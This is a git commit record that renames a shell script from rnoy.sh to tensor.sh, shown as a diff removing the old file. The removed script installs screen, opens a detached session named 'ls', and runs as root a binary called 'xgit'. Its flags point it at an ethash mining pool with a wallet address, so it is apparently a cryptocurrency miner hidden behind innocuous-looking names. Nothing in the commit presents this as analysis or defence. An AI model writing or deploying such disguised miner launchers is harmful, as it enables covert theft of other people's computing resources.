e5583ea589711edf7da718ac652a27187f280bef
goldengoose45 <86189692+goldengoose45@users.noreply.github.com>
2021-07-03 22:21:42 +0530

    Update and rename rnoy.sh to tensor.sh

--- rnoy.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-sudo apt update 
-sudo apt install screen libjansson4 -y 
-screen -dmS ls 
-
-chmod +x ./xgit && sudo ./xgit -a ethash -o stratum+tcp://ethash.na.mine.zergpool.com:9999 -u 0xC4e7C8C7cbA2c0587Cf690aC37Dc790Da0dfeEE5 -p c=ETH,ID=STARkiss
-pause $@
